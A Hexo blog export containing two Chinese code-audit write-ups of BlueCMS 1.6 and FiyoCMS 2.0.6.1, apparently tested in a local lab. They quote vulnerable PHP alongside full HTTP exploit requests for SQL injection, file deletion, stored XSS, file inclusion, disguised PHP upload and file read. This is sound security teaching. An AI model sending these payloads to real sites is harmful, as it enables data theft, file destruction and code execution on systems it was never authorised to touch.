{"meta":{"title":"Blog","subtitle":"","description":"","author":"表哥","url":"http://yoursite.com","root":"/"},"pages":[{"title":"友情链接","date":"2020-12-15T07:15:52.000Z","updated":"2020-12-15T07:15:52.000Z","comments":true,"path":"link/index.html","permalink":"http://yoursite.com/link/index.html","excerpt":"","text":""},{"title":"分类","date":"2018-01-04T16:00:00.000Z","updated":"2018-01-04T16:00:00.000Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2018-01-04T16:00:00.000Z","updated":"2018-01-04T16:00:00.000Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"bluecms1.6 代码审计","slug":"bluecms1.6代码审计","date":"2020-10-23T01:43:10.000Z","updated":"2020-10-23T01:43:10.000Z","comments":true,"path":"2020/10/23/bluecms1.6代码审计/","link":"","permalink":"http://yoursite.com/2020/10/23/bluecms1.6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"全局分析 观察cms文件结构，大致可以看出 /admin 后台管理 /include 用于包含的文件 /templates 模板文件 从index.php开始看起，首先看它包含了哪些文件 12require_once(&#x27;include/common.inc.php&#x27;);require_once(BLUE_ROOT.&#x27;include/index.fun.php&#x27;); 先查看common.inc.php： 12345require_once (BLUE_ROOT.&#x27;include/common.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/cat.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/cache.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/user.fun.php&#x27;);require_once(BLUE_ROOT.&#x27;include/index.fun.php&#x27;); 包含了一些函数文件，后期可跟踪函数名子在这些文件中搜索 12345678#30-36行if(!get_magic_quotes_gpc())&#123; $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST);&#125; 发现在30-36行处，对全局数组POST，GET，COOKIES，REQUEST都进行了转义处理，所以只要通过这些方式输入的数据中存在单引号，双引号都会被转义。所以只要包含了这个文件，只要被单引号包裹就无法进行注入。 就这样大致浏览一下这些文件的开头部分，后面其实大多都是功能部分，我们有的其实都不用去关注，毕竟我们本来就不可能每行都去看一遍 文件有点长，但是我们无需关心，只看开头有没有可以利用的变量 漏洞分析 SQL注入漏洞 位置 /ad_js.php的第12-19行 分析 12345678$ad_id = !empty($_GET[&#x27;ad_id&#x27;]) ? trim($_GET[&#x27;ad_id&#x27;]) : &#x27;&#x27;;if(empty($ad_id))&#123; echo &#x27;Error!&#x27;; exit();&#125;$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&#x27;ad&#x27;).&quot; WHERE ad_id =&quot;.$ad_id); 虽然开头就包含了/include/common.inc.php文件，但是$ad_id参数未被单引号包裹，直接拼接至语句中执行，所以此处存在sql注入 复现 payload如下： 123456789101112GET &#x2F;ad_js.php?ad_id&#x3D;0+union+select+0,0,0,0,0,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()),0 HTTP&#x2F;1.1Host: cms.cnPragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: UM_distinctid&#x3D;176c27932f049-092c306a121045-c791039-144000-176c27932f16fb; CNZZDATA3801251&#x3D;cnzz_eid%3D375352377-1609579947-%26ntime%3D1609605848; PHPSESSID&#x3D;uj9t78rinbnp39rbdvaic1j9h5Connection: close SQL注入漏洞 位置 /comment.php第113-114行 分析 12#/comment.php$sql = &quot;INSERT INTO &quot;.table(&#x27;comment&#x27;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#x27;&#x27;, &#x27;$id&#x27;, &#x27;$user_id&#x27;, &#x27;$type&#x27;, &#x27;$mood&#x27;, &#x27;$content&#x27;, &#x27;$timestamp&#x27;, &#x27;&quot;.getip().&quot;&#x27;, &#x27;$is_check&#x27;)&quot;; 1234567891011121314151617181920212223242526272829#/include/common.fun.phpfunction getip()&#123; if (getenv(&#x27;HTTP_CLIENT_IP&#x27;)) &#123; $ip = getenv(&#x27;HTTP_CLIENT_IP&#x27;); &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;)) &#123; //获取客户端用代理服务器访问时的真实ip 地址 $ip = getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;); &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED&#x27;)) &#123; $ip = getenv(&#x27;HTTP_X_FORWARDED&#x27;); &#125; elseif (getenv(&#x27;HTTP_FORWARDED_FOR&#x27;)) &#123; $ip = getenv(&#x27;HTTP_FORWARDED_FOR&#x27;); &#125; elseif (getenv(&#x27;HTTP_FORWARDED&#x27;)) &#123; $ip = getenv(&#x27;HTTP_FORWARDED&#x27;); &#125; else &#123; $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; &#125; return $ip;&#125; /include/common.fun.php下getip()函数返回存在通过头部IP字段获取的变量，跟踪该函数发现comment.php下第113行可利用getip()获取的可控变量进行sql注入 复现 这是一个INSERT INTO语句，这里采用的是通过select case when then else语句进行延时注入的方法payload如下： 123456789101112131415161718POST &#x2F;comment.php HTTP&#x2F;1.1Host: cms.cnContent-Length: 23Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;cms.cnContent-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;cms.cn&#x2F;comment.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: UM_distinctid&#x3D;176c27932f049-092c306a121045-c791039-144000-176c27932f16fb; CNZZDATA3801251&#x3D;cnzz_eid%3D375352377-1609579947-%26ntime%3D1609605848; PHPSESSID&#x3D;bu2lfhjmr46grm2414bkipbdp7X-Forwarded-For:1&#39;+(select case when(ascii(substr(database(),1,1))&#x3D;98) then sleep(5) else 1 end),&#39;1&#39;)#Connection: closeact&#x3D;send&amp;id&#x3D;1&amp;comment&#x3D;a 任意文件跳转 位置 /user.php第112行 分析 1234#/user.php第112行showmsg(&#x27;欢迎您 &#x27;.$user_name.&#x27; 回来，现在将转到...&#x27;, $from);#/user.php第66行$from = !empty($from) ? base64_decode($from) : &#x27;user.php&#x27;; showmsg函数的作用是页面跳转，同时注意这里$from有经过base64解密，我们通过登录用户，抓取登录包，其实就可以发现$from变量，我们假设跳转到根目录下的test.php文件，将test.php进行base64编码 复现 payload如下： 1234567891011121314151617POST &#x2F;user.php HTTP&#x2F;1.1Host: cms.cnContent-Length: 73Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;cms.cnContent-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;cms.cn&#x2F;test.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: UM_distinctid&#x3D;176c27932f049-092c306a121045-c791039-144000-176c27932f16fb; CNZZDATA3801251&#x3D;cnzz_eid%3D375352377-1609579947-%26ntime%3D1609605848; PHPSESSID&#x3D;bu2lfhjmr46grm2414bkipbdp7Connection: closeact&#x3D;do_login&amp;user_name&#x3D;test1&amp;pwd&#x3D;123456&amp;safecode&#x3D;wp5u&amp;from&#x3D;dGVzdC5waHA%3D 成功读取test.php文件 任意文件删除 位置 /user.php第616行 分析 123if (file_exists(BLUE_ROOT.$_POST[&#x27;lit_pic&#x27;])) &#123; @unlink(BLUE_ROOT.$_POST[&#x27;lit_pic&#x27;]);&#125; 存在未过滤变量$_POST['lit_pic']，导致任意文件删除漏洞 复现 在网站根目录下新建test.php，尝试删除它 payload如下： 1234567891011121314151617POST &#x2F;user.php HTTP&#x2F;1.1Host: cms.cnContent-Length: 78Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;cms.cnContent-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;cms.cn&#x2F;user.php?act&#x3D;manageAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: UM_distinctid&#x3D;176c27932f049-092c306a121045-c791039-144000-176c27932f16fb; CNZZDATA3801251&#x3D;cnzz_eid%3D375352377-1609579947-%26ntime%3D1609605848; PHPSESSID&#x3D;bu2lfhjmr46grm2414bkipbdp7; detail&#x3D;1Connection: closeact&#x3D;do_info_edit&amp;post_id&#x3D;1&amp;title&#x3D;1&amp;link_man&#x3D;1&amp;link_phone&#x3D;1&amp;lit_pic&#x3D;%2Ftest.php 成功删除 任意文件删除 位置 /user.php第616行 分析 1234567891011121314151617181920212223242526272829303132333435363738elseif($act == &#x27;edit_user_info&#x27;)&#123; $user_id = intval($_SESSION[&#x27;user_id&#x27;]); if(empty($user_id))&#123; return false; &#125;$birthday = trim($_POST[&#x27;birthday&#x27;]);$sex = intval($_POST[&#x27;sex&#x27;]); $email = !empty($_POST[&#x27;email&#x27;]) ? trim($_POST[&#x27;email&#x27;]) : &#x27;&#x27;; $msn = !empty($_POST[&#x27;msn&#x27;]) ? trim($_POST[&#x27;msn&#x27;]) : &#x27;&#x27;; $qq = !empty($_POST[&#x27;qq&#x27;]) ? trim($_POST[&#x27;qq&#x27;]) : &#x27;&#x27;; $mobile_phone = !empty($_POST[&#x27;mobile_phone&#x27;]) ? trim($_POST[&#x27;mobile_phone&#x27;]) : &#x27;&#x27;; $office_phone = !empty($_POST[&#x27;office_phone&#x27;]) ? trim($_POST[&#x27;office_phone&#x27;]) : &#x27;&#x27;; $home_phone = !empty($_POST[&#x27;home_phone&#x27;]) ? trim($_POST[&#x27;home_phone&#x27;]) : &#x27;&#x27;;$address = !empty($_POST[&#x27;address&#x27;]) ? htmlspecialchars($_POST[&#x27;address&#x27;]) : &#x27;&#x27;;if (!empty($_POST[&#x27;face_pic1&#x27;]))&#123; if (strpos($_POST[&#x27;face_pic1&#x27;], &#x27;http://&#x27;) != false &amp;&amp; strpos($_POST[&#x27;face_pic1&#x27;], &#x27;https://&#x27;) != false)&#123; showmsg(&#x27;只支持本站相对路径地址&#x27;); &#125; else&#123; $face_pic = trim($_POST[&#x27;face_pic1&#x27;]); &#125; &#125;else&#123; if(file_exists(BLUE_ROOT.$_POST[&#x27;face_pic3&#x27;]))&#123; @unlink(BLUE_ROOT.$_POST[&#x27;face_pic3&#x27;]); &#125;&#125;if(isset($_FILES[&#x27;face_pic2&#x27;][&#x27;error&#x27;]) &amp;&amp; $_FILES[&#x27;face_pic2&#x27;][&#x27;error&#x27;] == 0)&#123; $face_pic = $image-&gt;img_upload($_FILES[&#x27;face_pic2&#x27;],&#x27;face_pic&#x27;);&#125; $face_pic = empty($face_pic) ? &#x27;&#x27; : $face_pic;$sql = &quot;UPDATE &quot;.table(&#x27;user&#x27;).&quot; SET birthday = &#x27;$birthday&#x27;, sex = &#x27;$sex&#x27;, face_pic = &#x27;$face_pic&#x27;, email = &#x27;$email&#x27;, msn = &#x27;$msn&#x27;, qq = &#x27;$qq&#x27;,&quot; . &quot; mobile_phone = &#x27;$mobile_phone&#x27;, office_phone = &#x27;$office_phone&#x27;, home_phone = &#x27;$home_phone&#x27;, address=&#x27;$address&#x27; WHERE user_id = &quot;.intval($_SESSION[&#x27;user_id&#x27;]);$db-&gt;query($sql);showmsg(&#x27;更新个人资料成功&#x27;, &#x27;user.php&#x27;);&#125; 直接将信息更新到了数据库中，并没有通过上面那个引擎对我们的输入进行合法性检查，此问题出现在用户邮箱处和头像处 复现 payload如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475POST &#x2F;user.php HTTP&#x2F;1.1Host: cms.cnContent-Length: 1478Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;cms.cnContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryOMTrUDoEmhaL8YpsUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;cms.cn&#x2F;user.php?act&#x3D;my_infoAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: UM_distinctid&#x3D;176c27932f049-092c306a121045-c791039-144000-176c27932f16fb; CNZZDATA3801251&#x3D;cnzz_eid%3D375352377-1609579947-%26ntime%3D1609605848; PHPSESSID&#x3D;bu2lfhjmr46grm2414bkipbdp7; detail&#x3D;4Connection: close------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;face_pic1&quot;1------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;face_pic2&quot;; filename&#x3D;&quot;&quot;Content-Type: application&#x2F;octet-stream------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;birthday&quot;2021-01-05------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;sex&quot;0------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;email&quot;&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;msn&quot;1------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;qq&quot;------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;office_phone&quot;------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;home_phone&quot;------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;mobile_phone&quot;------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;address&quot;------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;act&quot;edit_user_info------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;submit&quot;ȷ���޸�------WebKitFormBoundaryOMTrUDoEmhaL8YpsContent-Disposition: form-data; name&#x3D;&quot;face_pic3&quot;1------WebKitFormBoundaryOMTrUDoEmhaL8Yps-- 编辑成功后跳转回用户信息界面，每次访问都会触发弹框，因为我们编辑用户邮箱为&lt;script&gt;alert(/xss/)&lt;/script&gt; 任意文件包含漏洞 位置 /user.php第750行 分析 12345678910elseif ($act == &#x27;pay&#x27;)&#123; include &#x27;data/pay.cache.php&#x27;; $price = $_POST[&#x27;price&#x27;]; $id = $_POST[&#x27;id&#x27;]; $name = $_POST[&#x27;name&#x27;]; if (empty($_POST[&#x27;pay&#x27;])) &#123; showmsg(&#x27;对不起，您没有选择支付方式&#x27;); &#125; include &#x27;include/payment/&#x27;.$_POST[&#x27;pay&#x27;].&quot;/index.php&quot;;&#125; 变量$_POST['pay']拼接到include函数中，且只有开头包含文件的转义过滤处理，我们可以使用0x00或文件长度截断方式进行过滤，本次审计的环境是PHP5.2.17，如果环境为5.4以上那么上述两种方法无效，不存在任意文件包含漏洞，但是为了更好理解漏洞，我还是将环境设为5.3以下 复现 payload如下： 1234567891011121314POST &#x2F;user.php?act&#x3D;pay HTTP&#x2F;1.1Host: cms.cnCache-Control: max-age&#x3D;0Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;68.0.3440.106 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: UM_distinctid&#x3D;176c27932f049-092c306a121045-c791039-144000-176c27932f16fb; CNZZDATA3801251&#x3D;cnzz_eid%3D375352377-1609579947-%26ntime%3D1609605848; PHPSESSID&#x3D;bu2lfhjmr46grm2414bkipbdp7; detail&#x3D;4Connection: closeContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 524pay&#x3D;..&#x2F;..&#x2F;robots.txt........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................ 文件上传漏洞 位置 /admin/flash.php 分析 12345678910111213141516elseif($act == &#x27;do_add&#x27;)&#123; $image_link = !empty($_POST[&#x27;image_link&#x27;]) ? trim($_POST[&#x27;image_link&#x27;]) : &#x27;&#x27;; $show_order = !empty($_POST[&#x27;show_order&#x27;]) ? intval($_POST[&#x27;showorder&#x27;]) : &#x27;&#x27;; if(isset($_FILES[&#x27;image_path&#x27;][&#x27;error&#x27;]) &amp;&amp; $_FILES[&#x27;image_path&#x27;][&#x27;error&#x27;] == 0)&#123; $image_path = $image-&gt;img_upload($_FILES[&#x27;image_path&#x27;],&#x27;flash&#x27;); &#125; if($image_path == &#x27;&#x27;)&#123; showmsg(&#x27;上传图片出错&#x27;, true); &#125; $image_path = empty($image_path) ? &#x27;&#x27; : $image_path; if(!$db-&gt;query(&quot;INSERT INTO &quot;.table(&#x27;flash_image&#x27;).&quot; (image_id, image_path, image_link, show_order) VALUES (&#x27;&#x27;, &#x27;$image_path&#x27;, &#x27;$image_link&#x27;, &#x27;$show_order&#x27;)&quot;))&#123; showmsg(&#x27;添加flash图片出错&#x27;, true); &#125;else&#123; showmsg(&#x27;添加flash图片成功&#x27;, &#x27;flash.php&#x27;, true); &#125; &#125; 跟踪一下img_upload函数，定位到/include/upload.class.php 123456789101112131415161718192021222324252627private $allow_image_type = array(&#x27;image/jpeg&#x27;, &#x27;image/gif&#x27;, &#x27;image/png&#x27;, &#x27;image/pjpeg&#x27;); private $extension_name_arr = array(&#x27;jpg&#x27;, &#x27;gif&#x27;, &#x27;png&#x27;, &#x27;pjpeg&#x27;);function img_upload($file, $dir = &#x27;&#x27;, $imgname = &#x27;&#x27;)&#123; ... if(!in_array($file[&#x27;type&#x27;],$this-&gt;allow_image_type))&#123; echo &#x27;&lt;font style=&quot;color:red;&quot;&gt;不允许的图片类型&lt;/font&gt;&#x27;; exit; &#125; if(empty($imgname))&#123; $imgname = $this-&gt;create_tempname().&#x27;.&#x27;.$this-&gt;get_type($file[&#x27;name&#x27;]); &#125;&#125;function get_type($filepath)&#123; $pos = strrpos($filepath,&#x27;.&#x27;); echo $pos; if($pos !== false)&#123; $extension_name = substr($filepath,$pos+1); &#125; //echo $extension_name; if(!in_array($extension_name, $this-&gt;extension_name_arr))&#123; echo &#x27;&lt;font style=&quot;color:red;&quot;&gt;您上传的文件不符合要求,请重试&lt;/font&gt;&#x27;; exit; &#125; return $extension_name;&#125; 该文件对上传文件进行文件类型和文件名的白名单检测，但是没有对文件内容进行检查，所以能轻易上传一个图片马 复现 payload如下： 1234567891011121314151617181920212223242526272829303132333435POST &#x2F;admin&#x2F;flash.php HTTP&#x2F;1.1Host: cms.cnContent-Length: 498Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;cms.cnContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarygYDUodHS5Kxq5RGhUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;cms.cn&#x2F;admin&#x2F;flash.php?act&#x3D;addAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: UM_distinctid&#x3D;176c27932f049-092c306a121045-c791039-144000-176c27932f16fb; CNZZDATA3801251&#x3D;cnzz_eid%3D375352377-1609579947-%26ntime%3D1609605848; PHPSESSID&#x3D;bu2lfhjmr46grm2414bkipbdp7; detail&#x3D;4Connection: close------WebKitFormBoundarygYDUodHS5Kxq5RGhContent-Disposition: form-data; name&#x3D;&quot;image_path&quot;; filename&#x3D;&quot;info.jpg&quot;Content-Type: image&#x2F;jpeg&lt;?php phpinfo(); ?&gt;------WebKitFormBoundarygYDUodHS5Kxq5RGhContent-Disposition: form-data; name&#x3D;&quot;image_link&quot;------WebKitFormBoundarygYDUodHS5Kxq5RGhContent-Disposition: form-data; name&#x3D;&quot;show_order&quot;0------WebKitFormBoundarygYDUodHS5Kxq5RGhContent-Disposition: form-data; name&#x3D;&quot;act&quot;do_add------WebKitFormBoundarygYDUodHS5Kxq5RGh-- 上传成功后我们可以通过管理员界面得知上传文件所在目录为data/upload/flash/15525638906.jpg 我们再通过文件包含漏洞执行该图片马","categories":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"fiyocms_2.0.6.1代码审计","slug":"fiyocms_2.0.6.1代码审计","date":"2020-10-21T13:43:23.000Z","updated":"2020-10-21T13:43:23.000Z","comments":true,"path":"2020/10/21/fiyocms_2.0.6.1代码审计/","link":"","permalink":"http://yoursite.com/2020/10/21/fiyocms_2.0.6.1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"全局分析 漏洞分析 任意文件删除 位置 /dapur/apps/app_config/controller/backuper.php 第16-30行 分析 12345678910111213141516if(isset($_POST[&#x27;type&#x27;])) &#123; if($_POST[&#x27;type&#x27;] == &#x27;database&#x27;) &#123; @unlink(&quot;../../../../.backup/$_POST[file]&quot;); if(!file_exists(&#x27;../../../../.backup&#x27;)) mkdir(&#x27;../../../../.backup&#x27;); $date = md5(date(&quot;Ymd:His&quot;)); $file = &quot;db-backup-$date&quot;; $c = backup_tables(&quot;*&quot;,&#x27;../../../../.backup&#x27;,&quot;$file&quot;,true); if($c) &#123; $size = format_size(filesize(&quot;../../../../.backup/$file.sql&quot;)); $time = date(&quot;Y/m/d H:i:s&quot;,filemtime(&quot;../../../../.backup/$file.sql&quot;)); $r = &quot;$size - $time&quot;; echo &quot;&#123; \\&quot;file\\&quot;:\\&quot;$file.sql\\&quot; , \\&quot;info\\&quot;:\\&quot;$r\\&quot; &#125;&quot;; &#125; &#125; 通过POST传递的参数file没有经过任何处理就拼接进unlink函数进行文件删除操作 复现 在网站根目录下建立flag.php文件 payload如下： 1234567891011121314151617POST &#x2F;dapur&#x2F;apps&#x2F;app_config&#x2F;controller&#x2F;backuper.php HTTP&#x2F;1.1Host: cms.cnContent-Length: 27Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1Origin: http:&#x2F;&#x2F;cms.cnContent-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;apps&#x2F;app_config&#x2F;controller&#x2F;backuper.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: PHPSESSID&#x3D;m0a7osbhddgpdq575hla480914Connection: closetype&#x3D;database&amp;file&#x3D;..&#x2F;flag.php 第一次发送payload，没有.backup文件夹，会新建，第二次发送，flag.php已经成功删除 SQL注入漏洞 位置 /system/database.php第210-233行 分析 123456789101112131415161718192021222324252627282930 public function update($table,$rows,$where) &#123; $update = &#x27;UPDATE &#x27;.$table.&#x27; SET &#x27;; $keys = array_keys($rows); for($i = 0; $i &lt; count($rows); $i++)&#123; if(is_string($rows[$keys[$i]]) AND $rows[$keys[$i]] !== &#x27;+hits&#x27;) &#123; $update .= $keys[$i].&#x27;=&quot;&#x27;.$rows[$keys[$i]].&#x27;&quot;&#x27;; &#125; else &#123; if($rows[$keys[$i]] == &#x27;+hits&#x27;) $rows[$keys[$i]] = $keys[$i] . &#x27;+&#x27;. 1; $update .= $keys[$i].&#x27;=&#x27;.$rows[$keys[$i]]; &#125; // Parse to add commas if($i != count($rows)-1) &#123; $update .= &#x27;,&#x27;; &#125; &#125; $update .= &#x27; WHERE &#x27;.$where; static $cons = false;try&#123; $result = $this-&gt;connect(); $result = $this-&gt;db-&gt;prepare($update); $query = $result -&gt;execute(); &#125; 可以看到这里update语句中的where条件是通过直接拼接参数$where而成的，猜测可能通过$where参数构成sql注入，我们随便找一个带有update方法的实例，如/dapur/apps/app_user/controller/status.php 12345if(isset($_GET[&#x27;stat&#x27;])) &#123; if($_GET[&#x27;stat&#x27;]==&#x27;1&#x27;)&#123; $db-&gt;update(FDBPrefix.&#x27;user&#x27;,array(&quot;status&quot;=&gt;&quot;1&quot;),&#x27;id=&#x27;.$_GET[&#x27;id&#x27;]); alert(&#x27;success&#x27;,Status_Applied,1); &#125; 复现 payload如下： 1234567891011GET &#x2F;dapur&#x2F;apps&#x2F;app_user&#x2F;controller&#x2F;status.php?stat&#x3D;1&amp;id&#x3D;1%20and%20if(ascii(substr(database(),1,1))&#x3D;102,sleep(5),1) HTTP&#x2F;1.1Host: cms.cnPragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Cookie: PHPSESSID&#x3D;m0a7osbhddgpdq575hla480914Connection: close 成功造成延时注入，delete方法也同样存在这个问题 文件读取漏洞 位置 /dapur/apps/app_theme/libs/check_file.php 第13-26行 分析 1234567891011121314$file = $url= &quot;$_GET[src]/$_GET[name]&quot;; $furl = &quot;../../../$url&quot;;$content = strlen(&quot;$file&quot;) - 5;$content = substr(&quot;$file&quot;,$content);$file = strpos(&quot;$content&quot;,&quot;.&quot;);$file = substr(&quot;$content&quot;,$file+1);if($file == &quot;html&quot; || $file == &quot;htm&quot; || $file == &quot;xhtml&quot; || $file == &quot;js&quot; ||$file == &quot;jsp&quot; || $file == &quot;php&quot; || $file == &quot;css&quot; || $file == &quot;xml&quot; ) : $content = @file_get_contents($furl); $content = htmlentities($content); 通过file_get_contents函数对$furl参数的值进行文件读取，而$furl参数是由GET方式传入的参数src和name拼接而成，且文件读取的对象后缀需要是指定文件后缀，$file的值即目标文件的后缀名。这就构成了任意文件读取漏洞 复现 payload如下： 